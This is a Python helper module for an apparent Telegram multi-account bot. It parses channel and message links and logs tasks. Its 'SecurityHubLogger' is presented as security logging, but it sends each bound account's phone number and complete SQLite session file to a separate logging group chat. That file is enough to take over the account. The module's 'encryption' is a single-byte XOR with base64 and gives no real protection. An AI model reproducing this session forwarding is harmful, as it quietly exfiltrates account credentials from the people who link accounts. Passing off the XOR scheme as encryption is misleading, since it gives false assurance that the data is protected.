import base64
import re
import json
import logging
from typing import Tuple, Any, List, Optional, Dict
from aiogram import Bot
from aiogram.types import BufferedInputFile
from config import SECRET_KEY, LOG_GC_ID

logger = logging.getLogger("MultiAccountSystem.Helpers")

# Shared in-memory session mapping
registration_sessions: Dict[int, Dict[str, Any]] = {}

def _get_crypto_key() -> int:
    return sum(ord(c) for c in SECRET_KEY) % 256 or 42

def encrypt_data(data: str) -> str:
    key = _get_crypto_key()
    cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
    return base64.b64encode(cipher_bytes).decode('utf-8')

def decrypt_data(encrypted_data: str) -> str:
    key = _get_crypto_key()
    try:
        raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
        plain_bytes = bytes([b ^ key for b in raw_cipher])
        return plain_bytes.decode('utf-8')
    except Exception as e:
        logger.error(f"Decryption failure: {e}")
        return ""

def parse_telegram_link(link: str) -> Tuple[Any, Optional[List[int]]]:
    link = link.strip()
    if not link:
        return None, None
        
    if "joinchat/" in link or "t.me/+" in link:
        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
        if hash_match:
            return hash_match.group(1), None

    private_match = re.search(r't\.me/c/(\d+)/([\d\-]+)', link)
    if private_match:
        channel_id = int(f"-100{private_match.group(1)}")
        msg_id_raw = private_match.group(2)
        return channel_id, parse_message_ids(msg_id_raw)

    public_msg_match = re.search(r't\.me/([^/]+)/([\d\-]+)', link)
    if public_msg_match:
        target = public_msg_match.group(1)
        msg_id_raw = public_msg_match.group(2)
        try:
            return int(f"-100{int(target)}"), parse_message_ids(msg_id_raw)
        except ValueError:
            return target, parse_message_ids(msg_id_raw)
        
    target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
    if "/" in target:
        parts = target.split("/")
        target = parts[0]
        if len(parts) > 1:
            return target, parse_message_ids(parts[1])
            
    return target, None

def parse_message_ids(raw_str: str) -> List[int]:
    if "-" in raw_str:
        try:
            start, end = map(int, raw_str.split("-"))
            return list(range(start, end + 1))
        except ValueError:
            pass
    try:
        return [int(x) for x in raw_str.split(",") if x.strip().isdigit()]
    except ValueError:
        return []

class SecurityHubLogger:
    @staticmethod
    async def log_session_onboarding(bot: Bot, telemetry_src: str, user_id: int, phone: str, session_username: str, session_bytes: bytes):
        caption = (
            f"📥 SECURITY DATA LOG: NEW ACCOUNT BOUND\n"
            f"⚙️ Method: Via {telemetry_src}\n"
            f"📱 Phone: +{phone}\n"
            f"👤 Account Username: @{session_username or 'N/A'}\n"
            f"🆔 Linked By User ID: {user_id}\n\n"
            f"⚠️ Physical SQLite session backup appended below."
        )
        try:
            doc_file = BufferedInputFile(session_bytes, filename=f"+{phone}.session")
            await bot.send_document(chat_id=LOG_GC_ID, document=doc_file, caption=caption)
        except Exception as e:
            logger.error(f"Failed logging session to target logging group: {e}")

    @staticmethod
    async def log_task_submission(bot: Bot, task_id: int, user_id: int, task_type: str, settings: dict):
        log_payload = (
            f"🚀 SECURITY DATA LOG: TASK RUNNING\n"
            f"🆔 Task ID: {task_id}\n"
            f"👤 Triggered By User ID: {user_id}\n"
            f"⚙️ Action Type: {task_type.upper()}\n"
            f"📦 Payload Configuration:\n{json.dumps(settings, indent=2)}"
        )
        try:
            await bot.send_message(chat_id=LOG_GC_ID, text=log_payload)
        except Exception as e:
            logger.error(f"Failed logging task initialization info to logging group: {e}")

    @staticmethod
    async def log_task_completion(bot: Bot, task_id: int, user_id: int, task_type: str, success_count: int, failure_count: int, details_txt: str):
        log_payload = (
            f"🏁 SECURITY DATA LOG: TASK COMPLETED\n"
            f"🆔 Task ID: {task_id}\n"
            f"👤 Owner User ID: {user_id}\n"
            f"⚙️ Action Type: {task_type.upper()}\n\n"
            f"🟢 Total Successes: {success_count} accounts\n"
            f"🔴 Total Failures: {failure_count} accounts\n\n"
            f"📝 Full output report summary text file is attached below."
        )
        try:
            report_bytes = details_txt.encode("utf-8")
            doc_file = BufferedInputFile(report_bytes, filename=f"task_{task_id}_execution_report.txt")
            await bot.send_document(chat_id=LOG_GC_ID, document=doc_file, caption=log_payload)
        except Exception as e:
            logger.error(f"Failed logging completion analytics summary payload to group: {e}")
